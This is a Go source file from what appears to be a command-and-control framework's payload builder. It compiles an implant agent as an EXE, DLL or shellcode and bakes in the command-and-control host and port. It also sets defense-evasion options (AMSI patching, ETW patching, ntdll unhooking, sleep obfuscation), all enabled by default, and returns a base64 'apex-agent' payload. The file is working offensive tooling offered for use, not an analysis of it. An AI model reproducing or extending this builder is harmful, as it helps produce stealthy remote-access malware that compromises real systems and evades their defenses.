package builder

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// ResolveAgentDir finds the agent source directory. Tries: 1) explicit path, 2) cwd/agent, 3) relative to executable.
func ResolveAgentDir(explicit string) (string, error) {
	if explicit != "" {
		abs, err := filepath.Abs(explicit)
		if err != nil {
			return "", err
		}
		if _, err := os.Stat(filepath.Join(abs, "main.c")); err == nil {
			return abs, nil
		}
		return "", fmt.Errorf("agent dir %q has no main.c", abs)
	}
	cwd, _ := os.Getwd()
	cwdAgent := filepath.Join(cwd, "agent")
	if _, err := os.Stat(filepath.Join(cwdAgent, "main.c")); err == nil {
		return filepath.Abs(cwdAgent)
	}
	exe, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("cannot get executable path: %w", err)
	}
	exeDir := filepath.Dir(exe)
	agentFromBin := filepath.Join(exeDir, "..", "agent")
	if _, err := os.Stat(filepath.Join(agentFromBin, "main.c")); err == nil {
		return filepath.Abs(agentFromBin)
	}
	agentFromRoot := filepath.Join(exeDir, "..", "..", "agent")
	if _, err := os.Stat(filepath.Join(agentFromRoot, "main.c")); err == nil {
		return filepath.Abs(agentFromRoot)
	}
	return "", fmt.Errorf("agent source not found: need agent/main.c in cwd, next to bin/, or set server.agent_dir in config")
}

// EvasionOpts holds compile-time evasion toggles for the agent build.
type EvasionOpts struct {
	SleepObfuscation bool
	UnhookNtdll      bool
	ETWPatch         bool
	AMSIPatch        bool
}

func boolToFlag(b bool) string {
	if b {
		return "1"
	}
	return "0"
}

// Build builds the agent with the given config. Returns the output file bytes, extension, or error.
func Build(agentDir, outputFormat, c2Host string, c2Port int, useHTTPS bool, evasion *EvasionOpts) ([]byte, string, error) {
	absDir, err := ResolveAgentDir(agentDir)
	if err != nil {
		return nil, "", err
	}

	host := c2Host
	if host == "" || host == "0.0.0.0" {
		host = "127.0.0.1"
	}
	port := c2Port
	if port <= 0 {
		port = 8080
	}
	https := 0
	if useHTTPS {
		https = 1
	}

	// Default: all evasion enabled
	ev := EvasionOpts{
		SleepObfuscation: true,
		UnhookNtdll:      true,
		ETWPatch:         true,
		AMSIPatch:        true,
	}
	if evasion != nil {
		ev = *evasion
	}

	env := append(os.Environ(),
		"C2_HOST="+host,
		fmt.Sprintf("C2_PORT=%d", port),
		fmt.Sprintf("USE_HTTPS=%d", https),
		"ENABLE_ETW_PATCH="+boolToFlag(ev.ETWPatch),
		"ENABLE_AMSI_PATCH="+boolToFlag(ev.AMSIPatch),
		"ENABLE_SLEEP_ENCRYPT="+boolToFlag(ev.SleepObfuscation),
		"ENABLE_UNHOOK="+boolToFlag(ev.UnhookNtdll),
	)

	var makeTarget string
	var outFile string
	switch strings.ToLower(outputFormat) {
	case "exe":
		makeTarget = "exe"
		outFile = "agent.exe"
	case "dll":
		makeTarget = "dll"
		outFile = "agent.dll"
	case "shellcode", "bin":
		makeTarget = "shellcode"
		outFile = "agent.bin"
	case "service_exe":
		makeTarget = "exe"
		outFile = "agent.exe"
	default:
		makeTarget = "exe"
		outFile = "agent.exe"
	}

	cleanCmd := exec.Command("make", "-C", absDir, "clean")
	cleanCmd.Env = env
	cleanCmd.Dir = absDir
	cleanCmd.CombinedOutput()

	cmd := exec.Command("make", "-C", absDir, makeTarget)
	cmd.Env = env
	cmd.Dir = absDir
	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, "", fmt.Errorf("build failed: %w\n%s", err, out)
	}

	outPath := filepath.Join(absDir, outFile)
	data, err := os.ReadFile(outPath)
	if err != nil {
		return nil, "", fmt.Errorf("read built output: %w", err)
	}

	ext := filepath.Ext(outFile)
	if ext == "" {
		ext = ".bin"
	}
	return data, ext, nil
}

// BuildBase64 builds and returns base64-encoded payload and filename.
func BuildBase64(agentDir, outputFormat, c2Host string, c2Port int, useHTTPS bool, evasion *EvasionOpts) (string, string, error) {
	data, ext, err := Build(agentDir, outputFormat, c2Host, c2Port, useHTTPS, evasion)
	if err != nil {
		return "", "", err
	}
	name := "apex-agent" + ext
	return base64.StdEncoding.EncodeToString(data), name, nil
}
